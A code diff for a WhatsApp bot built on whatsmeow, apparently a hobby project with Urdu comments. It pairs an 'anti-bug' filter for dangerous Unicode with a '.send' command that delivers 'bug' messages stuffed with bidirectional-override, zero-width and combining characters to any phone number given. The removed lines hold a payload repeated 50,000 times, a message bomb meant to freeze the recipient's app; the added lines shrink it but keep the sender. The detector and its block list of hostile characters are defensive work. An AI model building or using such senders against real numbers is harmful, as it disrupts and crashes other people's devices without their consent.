@@ -15,7 +15,7 @@ import (
 	"github.com/redis/go-redis/v9"
 )
 
-var AntiBugEnabled bool = false
+var AntiBugEnabled = false
 
 // 🛡️ سیٹنگز کا ڈھانچہ (Structure)
 // اس میں تم مزید چیزیں بھی ڈال سکتے ہو جیسے AntiLink، Welcome وغیرہ
@@ -720,32 +720,59 @@ func handleGroupInfoChange(client *whatsmeow.Client, v *events.GroupInfo) {
 //bug 🪲 🐛 menu
 
 var badChars = []string{
-	"\u200b", // Zero Width Space (Type 1)
-	"\u202e", // Right-To-Left Override (Type 2)
-	"\u202d", // Left-To-Right Override (Type 2)
-	"\u2060", // Word Joiner (Type 3)
-	"\u200f", // RTL Mark (Type 3)
+	"\u200b", // Zero Width Space
+	"\u200c", // ZWNJ
+	"\u200d", // ZWJ
+	"\u202a", // LRE
+	"\u202b", // RLE
+	"\u202c", // PDF
+	"\u202d", // LRO
+	"\u202e", // RLO
+	"\u2060", // Word Joiner
+	"\u2066", // LRI
+	"\u2067", // RLI
+	"\u2068", // FSI
+	"\u2069", // PDI
+	"\ufeff", // BOM
+	"\u200f", // RTL Mark
 }
 
-func handleAntiBug(client *whatsmeow.Client, v *events.Message) {
-	// اسٹیٹس چینج کریں
-	AntiBugEnabled = !AntiBugEnabled
-	
-	statusText := "OFF ❌"
-	if AntiBugEnabled {
-		statusText = "ON ✅"
+func extractText(m *waProto.Message) string {
+	if m.GetConversation() != "" {
+		return m.GetConversation()
+	}
+	if m.GetExtendedTextMessage() != nil {
+		return m.GetExtendedTextMessage().GetText()
+	}
+	return ""
+}
+
+func detectAntiBug(msg string) bool {
+	// Simple bad char scan
+	for _, bad := range badChars {
+		if strings.Contains(msg, bad) {
+			return true
+		}
 	}
 
-	reply := fmt.Sprintf("🛡️ *Anti-Bug System*\n\nCurrent Status: %s", statusText)
-	
-	// جواب بھیجیں
-	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
-		Conversation: proto.String(reply),
-	})
+	// Combining marks flood check
+	comb := 0
+	for _, r := range msg {
+		if unicode.Is(unicode.Mn, r) {
+			comb++
+			if comb > 2 {
+				return true
+			}
+		} else {
+			comb = 0
+		}
+	}
+
+	return false
 }
 
 func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
-	// چیک کریں کہ آرگیومنٹس پورے ہیں (کم از کم ٹائپ اور نمبر)
+
 	if len(args) < 2 {
 		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
 			Conversation: proto.String("⚠️ Usage: .send <type> <number>\nTypes: 1, 2, 3, all"),
@@ -753,48 +780,45 @@ func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
 		return
 	}
 
-	bugType := strings.ToLower(args[0]) // 1, 2, 3, or all
+	bugType := strings.ToLower(args[0])
 	targetNum := args[1]
 
-	// نمبر فارمیٹنگ
 	if !strings.Contains(targetNum, "@s.whatsapp.net") {
-		targetNum = targetNum + "@s.whatsapp.net"
+		targetNum += "@s.whatsapp.net"
 	}
+
 	jid, err := types.ParseJID(targetNum)
 	if err != nil {
-		fmt.Println("Invalid Number:", err)
 		return
 	}
 
-	// --- Payloads کی تیاری ---
-	// نوٹ: یہ اصلی وائرس نہیں ہیں، صرف ٹیسٹنگ کے لیے موک (Mock) ڈیٹا ہے۔
-	
-	// Payload 1: Zero Width Spaces (عام طریقہ)
-	payload1 := strings.Repeat("\u200b", 80)
+	// ---- PAYLOADS ----
+	payload1 := strings.Repeat("\u200b", 60)
 
-	// Payload 2: Right-to-Left Overrides (ٹیکسٹ ڈائریکشن بگز)
-	payload2 := strings.Repeat("\u202a\u202b\u202c\u202d\u202e\u202e\u202d\u202d\u202e\u202e\u202e\u202d\u202d\u202e\u200b\u202e\u200d\u202d\u200b\u202d\u200d\u202e\u200b\u200d\u200b\u200c\u200d\u200b\u200b\u200d\u200d\u200b\u200c\u200d\ufeff\ufeff\ufeff\ufeff\u200b\u2066\u2067\u2068\u2069\u2066\u2067\u2067\u2069\u2066\u202e\u0300\u0301\u0302\u0300\u0300\u0301\u0301\u0300\u0301\u0336\u0336\u0336\u034f\u034f\u034f\uffff\ufffe\ufdd0\ufdef", 50000)
+	payload2 := strings.Repeat(
+		"\u202a\u202b\u202c\u202d\u202e\u202e\u202d\u202d"+
+			"\u202e\u200b\u202e\u200d\u202d\u200b\u202d\u200d"+
+			"\u2066\u2067\u2068\u2069\u2066\u2067"+
+			"\u0300\u0301\u0302\u0336\u034f", 6)
 
-	// Payload 3: Word Joiners & Marks (مکسچر)
-	payload3 := strings.Repeat("\u2060\u200f", 40)
+	payload3 := strings.Repeat("\u2060\u200f\u200b", 40)
 
 	var finalMessage string
 	var label string
 
 	switch bugType {
 	case "1":
-		label = "Type 1 (Hidden Spaces)"
-		finalMessage = "🚨 *TEST BUG 1* 🚨\n" + payload1 + "\nEnd of Test 1"
+		label = "Type 1 (Zero Width)"
+		finalMessage = "🚨 TEST BUG 1 🚨\n" + payload1
 	case "2":
-		label = "Type 2 (Direction Overrides)"
-		finalMessage = "🚨 *TEST BUG 2* 🚨\n" + payload2 + "\nEnd of Test 2"
+		label = "Type 2 (RTL Overrides)"
+		finalMessage = "🚨 TEST BUG 2 🚨\n" + payload2
 	case "3":
 		label = "Type 3 (Mixed Junk)"
-		finalMessage = "🚨 *TEST BUG 3* 🚨\n" + payload3 + "\nEnd of Test 3"
+		finalMessage = "🚨 TEST BUG 3 🚨\n" + payload3
 	case "all":
-		label = "ALL TYPES (Mega Test)"
-		// سب کو ملا کر ایک ہیوی ٹیسٹ، لیکن اتنا نہیں کہ موبائل پھنس جائے
-		finalMessage = "🚨 *MEGA TEST BUG* 🚨\n" + payload1 + payload2 + payload3 + "\nChecking detection for ALL types."
+		label = "ALL TYPES"
+		finalMessage = "🚨 MEGA TEST 🚨\n" + payload1 + payload2 + payload3
 	default:
 		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
 			Conversation: proto.String("❌ Invalid Type. Use 1, 2, 3 or all"),
@@ -802,20 +826,29 @@ func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
 		return
 	}
 
-	// میسج بھیجنا
-	resp, err := client.SendMessage(context.Background(), jid, &waProto.Message{
+	client.SendMessage(context.Background(), jid, &waProto.Message{
 		Conversation: proto.String(finalMessage),
 	})
 
-	if err != nil {
-		fmt.Println("Error sending:", err)
+	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
+		Conversation: proto.String("✅ Sent: " + label),
+	})
+}
+
+func handleIncoming(client *whatsmeow.Client, v *events.Message) {
+	if !AntiBugEnabled {
+		return
+	}
+
+	text := extractText(v.Message)
+	if text == "" {
+		return
+	}
+
+	if detectAntiBug(text) {
 		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
-			Conversation: proto.String("❌ Failed to send."),
+			Conversation: proto.String("🛡️ Anti-Bug: Dangerous Unicode blocked"),
 		})
-	} else {
-		fmt.Printf("Sent %s to %s (ID: %s)\n", label, targetNum, resp.ID)
-		client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
-			Conversation: proto.String("✅ Sent: " + label + "\nWatch if Anti-Bug deletes it."),
-		})
+		return
 	}
 }
